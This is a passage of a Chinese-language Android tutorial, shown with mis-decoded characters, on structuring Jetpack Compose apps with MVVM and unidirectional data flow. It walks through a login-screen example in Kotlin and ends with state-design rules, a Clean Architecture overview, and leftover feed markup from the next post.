<h3 data-id="heading-1">äºŒã€Compose ä¸»æµæ¶æ„ï¼šMVVM + å•å‘æ•°æ®æµï¼ˆUDFï¼‰</h3>
<p>è¿™æ˜¯ Google å®˜æ–¹æ¨èçš„æ¶æ„ï¼Œæ ¸å¿ƒæ˜¯ã€ŒçŠ¶æ€ä¸Šç§»ã€å•å‘æµè½¬ã€ï¼Œåˆ†ä¸º 4 å±‚ï¼ŒèŒè´£æ¸…æ™°ä¸”é€‚é… Compose çš„é‡ç»„ç‰¹æ€§ï¼š</p>
<h4 data-id="heading-2">1. æ¶æ„åˆ†å±‚ï¼ˆä»ä¸Šåˆ°ä¸‹ï¼‰</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-operator">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-operator">â”‚</span> <span class="hljs-type">UI</span> å±‚ï¼ˆ<span class="hljs-type">Composable</span> å‡½æ•°ï¼‰ <span class="hljs-operator">â”‚</span> ä»…è®¢é˜…çŠ¶æ€<span class="hljs-operator">ã€</span>è§¦å‘äº‹ä»¶ï¼Œæ— ä¸šåŠ¡é€»è¾‘
<span class="hljs-operator">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
              <span class="hljs-operator">â”‚</span> å‘é€äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»ï¼‰<span class="hljs-operator">/</span> æ¥æ”¶çŠ¶æ€æ›´æ–°
<span class="hljs-operator">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-operator">â”‚</span> <span class="hljs-type">ViewModel</span> å±‚ï¼ˆçŠ¶æ€æŒæœ‰ï¼‰ <span class="hljs-operator">â”‚</span> å¤„ç†<span class="hljs-type">UIäº‹ä»¶</span><span class="hljs-operator">ã€</span>ç®¡ç†çŠ¶æ€<span class="hljs-operator">ã€</span>è°ƒç”¨ä»“åº“å±‚ï¼Œä¸æŒæœ‰<span class="hljs-type">UIå¼•ç”¨</span>
<span class="hljs-operator">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
              <span class="hljs-operator">â”‚</span> è°ƒç”¨æ¥å£<span class="hljs-operator">/</span>æœ¬åœ°æ•°æ®
<span class="hljs-operator">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-operator">â”‚</span> <span class="hljs-type">Repository</span> å±‚ï¼ˆæ•°æ®ä»“åº“ï¼‰<span class="hljs-operator">â”‚</span> ç»Ÿä¸€ç®¡ç†æ•°æ®æ¥æºï¼ˆç½‘ç»œ<span class="hljs-operator">/</span>æœ¬åœ°<span class="hljs-type">DB</span><span class="hljs-operator">/</span><span class="hljs-type">SharedPrefï¼‰ï¼Œè§£è€¦æ•°æ®é€»è¾‘</span>
<span class="hljs-operator">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
              <span class="hljs-operator">â”‚</span> æ•°æ®è¯·æ±‚<span class="hljs-operator">/</span>å­˜å‚¨
<span class="hljs-operator">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-operator">â”‚</span> <span class="hljs-type">Data</span> å±‚ï¼ˆæ•°æ®æºï¼‰<span class="hljs-operator">â”‚</span> ç½‘ç»œæ¥å£ï¼ˆ<span class="hljs-type">Retrofitï¼‰</span><span class="hljs-operator">ã€</span>æœ¬åœ°<span class="hljs-type">DBï¼ˆRoomï¼‰</span><span class="hljs-operator">ã€</span><span class="hljs-type">SPç­‰</span>
<span class="hljs-operator">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre>
<h4 data-id="heading-3">2. æ ¸å¿ƒåŸåˆ™ï¼šå•å‘æ•°æ®æµï¼ˆUDFï¼‰</h4>
<p>æ•°æ®åªèƒ½æ²¿ã€ŒData â†’ Repository â†’ ViewModel â†’ UIã€æ–¹å‘æµè½¬ï¼Œåå‘ä»…é€šè¿‡ã€Œäº‹ä»¶ã€è§¦å‘ï¼Œé¿å…çŠ¶æ€æ··ä¹±ï¼š</p>
<pre><code class="hljs">UI è§¦å‘äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»æŒ‰é’®ï¼‰â†’ ViewModel å¤„ç†äº‹ä»¶ â†’ è°ƒç”¨ Repository è·å–æ•°æ® â†’ ViewModel æ›´æ–°çŠ¶æ€ â†’ UI è‡ªåŠ¨é‡ç»„ 
</code></pre>
<h3 data-id="heading-4">ä¸‰ã€å®Œæ•´ç¤ºä¾‹ï¼šMVVM + å•å‘æ•°æ®æµ</h3>
<p>ä»¥â€œç™»å½•é¡µâ€ä¸ºä¾‹ï¼Œè¦†ç›–çŠ¶æ€ç®¡ç†ã€äº‹ä»¶å¤„ç†ã€æ•°æ®è¯·æ±‚å…¨æµç¨‹ï¼š</p>
<h4 data-id="heading-5">Step 1ï¼šData å±‚ï¼ˆç½‘ç»œè¯·æ±‚ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. æ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginRequest</span>(<span class="hljs-keyword">val</span> username: String, <span class="hljs-keyword">val</span> password: String)
<span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginResponse</span>(<span class="hljs-keyword">val</span> token: String, <span class="hljs-keyword">val</span> userId: String)

<span class="hljs-comment">// 2. ç½‘ç»œæ¥å£ï¼ˆRetrofitï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoginApi</span> {
    <span class="hljs-meta">@POST(<span class="hljs-string">"login"</span>)</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-meta">@Body</span> request: <span class="hljs-type">LoginRequest</span>)</span></span>: LoginResponse
}

<span class="hljs-comment">// 3. æœ¬åœ°æ•°æ®æºï¼ˆç¤ºä¾‹ï¼šSharedPref ä¿å­˜ Tokenï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginLocalDataSource</span>(context: Context) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> sp = context.getSharedPreferences(<span class="hljs-string">"login"</span>, Context.MODE_PRIVATE)
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">saveToken</span><span class="hljs-params">(token: <span class="hljs-type">String</span>)</span></span> {
        sp.edit().putString(<span class="hljs-string">"token"</span>, token).apply()
    }
    
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getToken</span><span class="hljs-params">()</span></span>: String? = sp.getString(<span class="hljs-string">"token"</span>, <span class="hljs-literal">null</span>)
}
</code></pre>
<h4 data-id="heading-6">Step 2ï¼šRepository å±‚ï¼ˆæ•°æ®ä»“åº“ï¼‰</h4>
<p>ç»Ÿä¸€ç®¡ç†æ•°æ®æ¥æºï¼ŒViewModel æ— éœ€å…³å¿ƒæ•°æ®ä»ç½‘ç»œ/æœ¬åœ°æ¥ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginRepository</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> api: LoginApi,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> localDataSource: LoginLocalDataSource
) {
    <span class="hljs-comment">// ç™»å½•è¯·æ±‚ï¼ˆæŒ‚èµ·å‡½æ•°ï¼Œé€‚é…åç¨‹ï¼‰</span>
    <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">login</span><span class="hljs-params">(username: <span class="hljs-type">String</span>, password: <span class="hljs-type">String</span>)</span></span>: LoginResponse {
        <span class="hljs-keyword">val</span> response = api.login(LoginRequest(username, password))
        <span class="hljs-comment">// ç™»å½•æˆåŠŸåä¿å­˜ Token åˆ°æœ¬åœ°</span>
        localDataSource.saveToken(response.token)
        <span class="hljs-keyword">return</span> response
    }
}
</code></pre>
<h4 data-id="heading-7">Step 3ï¼šViewModel å±‚ï¼ˆçŠ¶æ€æŒæœ‰ + äº‹ä»¶å¤„ç†ï¼‰</h4>
<p>æ ¸å¿ƒæ˜¯ç”¨ <code>StateFlow</code>/<code>LiveData</code> æŒæœ‰å¯è§‚å¯ŸçŠ¶æ€ï¼ŒCompose è®¢é˜…åè‡ªåŠ¨é‡ç»„ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginViewModel</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> repository: LoginRepository
) : ViewModel() {
    <span class="hljs-comment">// 1. UI çŠ¶æ€ï¼ˆèšåˆæ‰€æœ‰éœ€è¦é©±åŠ¨ UI çš„æ•°æ®ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _uiState = MutableStateFlow(LoginUiState())
    <span class="hljs-keyword">val</span> uiState: StateFlow&lt;LoginUiState&gt; = _uiState.asStateFlow() <span class="hljs-comment">// å¯¹å¤–æš´éœ²åªè¯»æµ</span>

    <span class="hljs-comment">// 2. å¤„ç†ç™»å½•äº‹ä»¶ï¼ˆUI ç‚¹å‡»åè°ƒç”¨ï¼‰</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleLogin</span><span class="hljs-params">(username: <span class="hljs-type">String</span>, password: <span class="hljs-type">String</span>)</span></span> {
        <span class="hljs-comment">// æ ‡è®°åŠ è½½ä¸­</span>
        _uiState.update { it.copy(isLoading = <span class="hljs-literal">true</span>, errorMsg = <span class="hljs-string">""</span>) }
        
        <span class="hljs-comment">// åç¨‹å¤„ç†å¼‚æ­¥è¯·æ±‚ï¼ˆviewModelScope è‡ªåŠ¨ç»‘å®šç”Ÿå‘½å‘¨æœŸï¼‰</span>
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> response = repository.login(username, password)
                <span class="hljs-comment">// ç™»å½•æˆåŠŸï¼šæ›´æ–°çŠ¶æ€</span>
                _uiState.update { 
                    it.copy(
                        isLoading = <span class="hljs-literal">false</span>,
                        isLoginSuccess = <span class="hljs-literal">true</span>,
                        token = response.token
                    )
                }
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                <span class="hljs-comment">// ç™»å½•å¤±è´¥ï¼šæ›´æ–°é”™è¯¯çŠ¶æ€</span>
                _uiState.update { 
                    it.copy(
                        isLoading = <span class="hljs-literal">false</span>,
                        errorMsg = e.message ?: <span class="hljs-string">"ç™»å½•å¤±è´¥ï¼Œè¯·é‡è¯•"</span>
                    )
                }
            }
        }
    }

    <span class="hljs-comment">// å®šä¹‰ UI çŠ¶æ€æ•°æ®ç±»ï¼ˆèšåˆæ‰€æœ‰ UI æ‰€éœ€çŠ¶æ€ï¼‰</span>
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginUiState</span>(
        <span class="hljs-keyword">val</span> isLoading: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>,
        <span class="hljs-keyword">val</span> errorMsg: String = <span class="hljs-string">""</span>,
        <span class="hljs-keyword">val</span> isLoginSuccess: <span class="hljs-built_in">Boolean</span> = <span class="hljs-literal">false</span>,
        <span class="hljs-keyword">val</span> token: String = <span class="hljs-string">""</span>
    )
}
</code></pre>
<h4 data-id="heading-8">Step 4ï¼šUI å±‚ï¼ˆComposable å‡½æ•°ï¼‰</h4>
<p>ä»…è®¢é˜… ViewModel çŠ¶æ€ã€è§¦å‘äº‹ä»¶ï¼Œæ— ä»»ä½•ä¸šåŠ¡é€»è¾‘ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">@Composable
fun LoginScreen(
    viewModel: <span class="hljs-attr">LoginViewModel</span> = viewModel(), // è‡ªåŠ¨æ³¨å…¥ ViewModel
    onLoginSuccess: (String) -&gt; Unit // ç™»å½•æˆåŠŸåçš„è·³è½¬å›è°ƒ
) {
    // 1. æ”¶é›† ViewModel çŠ¶æ€ï¼ˆcollectAsState è‡ªåŠ¨è®¢é˜…ï¼ŒçŠ¶æ€å˜åŒ–è§¦å‘é‡ç»„ï¼‰
    val uiState by viewModel.uiState.collectAsStateWithLifecycle()
    
    // 2. è¾“å…¥æ¡†çŠ¶æ€ï¼ˆUI çº§ä¸´æ—¶çŠ¶æ€ï¼Œæ— éœ€æ”¾ ViewModelï¼‰
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }

    Column(
        <span class="hljs-attr">modifier</span> = Modifier
            .fillMaxSize()
            .padding(16.dp),
        <span class="hljs-attr">horizontalAlignment</span> = Alignment.CenterHorizontally,
        <span class="hljs-attr">verticalArrangement</span> = Arrangement.Center
    ) {
        // ç”¨æˆ·åè¾“å…¥æ¡†
        OutlinedTextField(
            <span class="hljs-attr">value</span> = username,
            <span class="hljs-attr">onValueChange</span> = { username = it },
            <span class="hljs-attr">label</span> = { Text(<span class="hljs-string">"ç”¨æˆ·å"</span>) },
            <span class="hljs-attr">singleLine</span> = <span class="hljs-literal">true</span>,
            <span class="hljs-attr">modifier</span> = Modifier.fillMaxWidth()
        )
        
        Spacer(<span class="hljs-attr">modifier</span> = Modifier.height(<span class="hljs-number">16</span>.dp))
        
        // å¯†ç è¾“å…¥æ¡†
        OutlinedTextField(
            <span class="hljs-attr">value</span> = password,
            <span class="hljs-attr">onValueChange</span> = { password = it },
            <span class="hljs-attr">label</span> = { Text(<span class="hljs-string">"å¯†ç "</span>) },
            <span class="hljs-attr">singleLine</span> = <span class="hljs-literal">true</span>,
            <span class="hljs-attr">visualTransformation</span> = PasswordVisualTransformation(),
            <span class="hljs-attr">modifier</span> = Modifier.fillMaxWidth()
        )
        
        // é”™è¯¯æç¤º
        if (uiState.errorMsg.isNotBlank()) {
            Text(
                <span class="hljs-attr">text</span> = uiState.errorMsg,
                <span class="hljs-attr">color</span> = Color.Red,
                <span class="hljs-attr">modifier</span> = Modifier.padding(top = <span class="hljs-number">8</span>.dp)
            )
        }
        
        Spacer(<span class="hljs-attr">modifier</span> = Modifier.height(<span class="hljs-number">16</span>.dp))
        
        // ç™»å½•æŒ‰é’®ï¼ˆåŠ è½½ä¸­ç¦ç”¨ï¼‰
        Button(
            <span class="hljs-attr">onClick</span> = { viewModel.handleLogin(username, password) },
            <span class="hljs-attr">enabled</span> = !uiState.isLoading,
            <span class="hljs-attr">modifier</span> = Modifier.fillMaxWidth()
        ) {
            if (uiState.isLoading) {
                CircularProgressIndicator(
                    <span class="hljs-attr">modifier</span> = Modifier.size(<span class="hljs-number">20</span>.dp),
                    <span class="hljs-attr">strokeWidth</span> = <span class="hljs-number">2</span>.dp
                )
            } else {
                Text("ç™»å½•")
            }
        }
    }

    // ç™»å½•æˆåŠŸï¼šè§¦å‘è·³è½¬ï¼ˆå‰¯ä½œç”¨ï¼Œç”¨ LaunchedEffect é¿å…é‡ç»„é‡å¤æ‰§è¡Œï¼‰
    LaunchedEffect(uiState.isLoginSuccess) {
        if (uiState.isLoginSuccess) {
            onLoginSuccess(uiState.token)
        }
    }
}
</code></pre>
<h4 data-id="heading-9">Step 5ï¼šActivity å±‚ï¼ˆä»…æ‰¿è½½ UIï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">ComponentActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContent {
            MyAppTheme {
                LoginScreen(onLoginSuccess = { token -&gt;
                    <span class="hljs-comment">// ç™»å½•æˆåŠŸè·³è½¬åˆ°é¦–é¡µ</span>
                    navController.navigate(<span class="hljs-string">"home"</span>)
                })
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-10">å››ã€çŠ¶æ€è®¾è®¡çš„æ ¸å¿ƒè§„åˆ™ï¼ˆé¿å‘å…³é”®ï¼‰</h3>
<h4 data-id="heading-11">1. çŠ¶æ€åˆ†ç±»ï¼šåŒºåˆ†â€œUI ä¸´æ—¶çŠ¶æ€â€å’Œâ€œä¸šåŠ¡çŠ¶æ€â€</h4>























<table><thead><tr><th>çŠ¶æ€ç±»å‹</th><th>ç¤ºä¾‹</th><th>å­˜æ”¾ä½ç½®</th><th>åŸå› </th></tr></thead><tbody><tr><td>UI ä¸´æ—¶çŠ¶æ€</td><td>è¾“å…¥æ¡†å†…å®¹ã€åˆ—è¡¨æ»šåŠ¨ä½ç½®ã€å¼¹çª—æ˜¾éš</td><td>Composable å†…ï¼ˆrememberï¼‰</td><td>ä»…å½±å“å•ä¸ª UI ç»„ä»¶ï¼Œæ— éœ€å…±äº«/æŒä¹…åŒ–</td></tr><tr><td>ä¸šåŠ¡çŠ¶æ€</td><td>ç™»å½•çŠ¶æ€ã€ç”¨æˆ·ä¿¡æ¯ã€æ¥å£è¿”å›æ•°æ®</td><td>ViewModelï¼ˆStateFlowï¼‰</td><td>éœ€è·¨ç»„ä»¶å…±äº«ã€æŒä¹…åŒ–ï¼Œæˆ–éšç”Ÿå‘½å‘¨æœŸä¿æ´»</td></tr></tbody></table>
<h4 data-id="heading-12">2. çŠ¶æ€ä¸Šç§»ï¼šé¿å…å±€éƒ¨çŠ¶æ€è€¦åˆ</h4>
<ul>
<li>è‹¥å¤šä¸ªå­ç»„ä»¶éœ€è¦å…±äº«çŠ¶æ€ï¼ˆå¦‚â€œç™»å½•æŒ‰é’®â€å’Œâ€œé”™è¯¯æç¤ºâ€å…±äº« <code>isLoading</code>ï¼‰ï¼Œå°†çŠ¶æ€ä¸Šç§»åˆ°çˆ¶ç»„ä»¶/ViewModelï¼›</li>
<li>ç¤ºä¾‹ï¼šè¾“å…¥æ¡†å†…å®¹æ˜¯â€œå±€éƒ¨çŠ¶æ€â€ï¼Œä½†â€œç™»å½•æ˜¯å¦æˆåŠŸâ€æ˜¯â€œå…¨å±€ä¸šåŠ¡çŠ¶æ€â€ï¼Œéœ€æ”¾åœ¨ ViewModelã€‚</li>
</ul>
<h4 data-id="heading-13">3. ä¸å¯å˜çŠ¶æ€ï¼šç”¨ data class + copy æ›´æ–°</h4>
<ul>
<li>æ‰€æœ‰çŠ¶æ€æ•°æ®ç±»ï¼ˆå¦‚ <code>LoginUiState</code>ï¼‰è®¾è®¡ä¸ºä¸å¯å˜ï¼ˆvalï¼‰ï¼Œæ›´æ–°æ—¶é€šè¿‡ <code>copy</code> ç”Ÿæˆæ–°å¯¹è±¡ï¼›</li>
<li>åŸå› ï¼šCompose ä¾èµ–â€œçŠ¶æ€å¯¹è±¡å¼•ç”¨å˜åŒ–â€è§¦å‘é‡ç»„ï¼Œå¯å˜å¯¹è±¡ä¼šå¯¼è‡´é‡ç»„å¤±æ•ˆã€‚</li>
</ul>
<h4 data-id="heading-14">4. ç”Ÿå‘½å‘¨æœŸç»‘å®šï¼šç”¨ collectAsStateWithLifecycle</h4>
<ul>
<li>æ”¶é›† StateFlow æ—¶ï¼Œä¼˜å…ˆç”¨ <code>collectAsStateWithLifecycle()</code>ï¼ˆè€Œé <code>collectAsState()</code>ï¼‰ï¼Œè‡ªåŠ¨åœ¨ Activity/Fragment è¿›å…¥åå°æ—¶æš‚åœæ”¶é›†ï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</li>
</ul>
<h3 data-id="heading-15">äº”ã€è¿›é˜¶ï¼šMVVM + Clean Architectureï¼ˆæ•´æ´æ¶æ„ï¼‰</h3>
<p>ä¸­å¤§å‹é¡¹ç›®å¯åœ¨ MVVM åŸºç¡€ä¸Šå¼•å…¥ Clean Architectureï¼Œè¿›ä¸€æ­¥åˆ†å±‚è§£è€¦ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Presentation å±‚ â”‚ UI + ViewModelï¼ˆä¸ MVVM ä¸€è‡´ï¼‰
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
<span class="hljs-code">          â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Domain å±‚       â”‚ ç”¨ä¾‹ï¼ˆUseCaseï¼‰+ é¢†åŸŸæ¨¡å‹ï¼ˆEntityï¼‰ï¼Œå°è£…æ ¸å¿ƒä¸šåŠ¡é€»è¾‘
â”‚                 â”‚ ç¤ºä¾‹ï¼šLoginUseCase å°è£…â€œæ ¡éªŒå‚æ•° + è°ƒç”¨ä»“åº“ + å¤„ç†ç»“æœâ€
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
          â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Data å±‚         â”‚ Repository + æ•°æ®æºï¼ˆç½‘ç»œ/æœ¬åœ°ï¼‰ï¼ŒDomain å±‚ä¸å…³å¿ƒæ•°æ®æ¥æº
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</span></code></pre>
<p>æ ¸å¿ƒä¼˜åŠ¿ï¼šDomain å±‚å®Œå…¨ç‹¬ç«‹äº UI å’Œæ•°æ®å±‚ï¼Œä¸šåŠ¡é€»è¾‘å¯å•ç‹¬æµ‹è¯•ï¼Œä¸”æ˜“é€‚é…å¤šç«¯ï¼ˆå¦‚ Compose Multiplatform å¤ç”¨ Domain å±‚ï¼‰ã€‚</p>
<h3 data-id="heading-16">å…­ã€æ€»ç»“</h3>
<p>1.<strong>ä¸»æµæ¶æ„</strong>ï¼šCompose é¦–é€‰ã€ŒMVVM + å•å‘æ•°æ®æµã€ï¼Œæ˜¯å®˜æ–¹æ¨èã€é€‚é…æ€§æœ€å¥½çš„æ–¹æ¡ˆï¼›</p>
<p>2.<strong>çŠ¶æ€æµè½¬</strong>ï¼šUI è§¦å‘äº‹ä»¶ â†’ ViewModel å¤„ç† â†’ Repository è·å–æ•°æ® â†’ ViewModel æ›´æ–°çŠ¶æ€ â†’ UI é‡ç»„ï¼›</p>
<p>3.<strong>æ ¸å¿ƒè§„åˆ™</strong>ï¼šçŠ¶æ€åˆ†ç±»å­˜æ”¾ã€ä¸å¯å˜è®¾è®¡ã€ç”Ÿå‘½å‘¨æœŸç»‘å®šã€çŠ¶æ€ä¸Šç§»ï¼›</p>
<p>4.<strong>è¿›é˜¶ä¼˜åŒ–</strong>ï¼šä¸­å¤§å‹é¡¹ç›®åŠ  Clean Architecture çš„ Domain å±‚ï¼Œè§£è€¦ä¸šåŠ¡é€»è¾‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨å·¥å…·æ³›æ»¥çš„æ—¶ä»£ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜è¦åšä¸€ä¸ªâ€œä¸ä¸€æ ·â€œçš„å·¥å…·ç«™]]></title>    <link>https://juejin.cn/post/7582861402278051874</link>    <guid>https://juejin.cn/post/7582861402278051874</guid>    <pubDate>2025-12-13T07:09:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582861402278051874" data-draft-id="7582845425402871848" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨å·¥å…·æ³›æ»¥çš„æ—¶ä»£ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜è¦åšä¸€ä¸ªâ€œä¸ä¸€æ ·â€œçš„å·¥å…·ç«™"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-13T07:09:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="èˆ’ä¸€ç¬‘ä¸ç§ƒå¤´"/> <meta itemprop="url" content="https://juejin.cn/user/4257747754552599"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨å·¥å…·æ³›æ»¥çš„æ—¶ä»£ï¼Œæˆ‘ä¸ºä»€ä¹ˆè¿˜è¦åšä¸€ä¸ªâ€œä¸ä¸€æ ·â€œçš„å·¥å…·ç«™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4257747754552599/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    èˆ’ä¸€ç¬‘ä¸ç§ƒå¤´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:09:51.000Z" title="Sat Dec 13 2025 07:09:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body 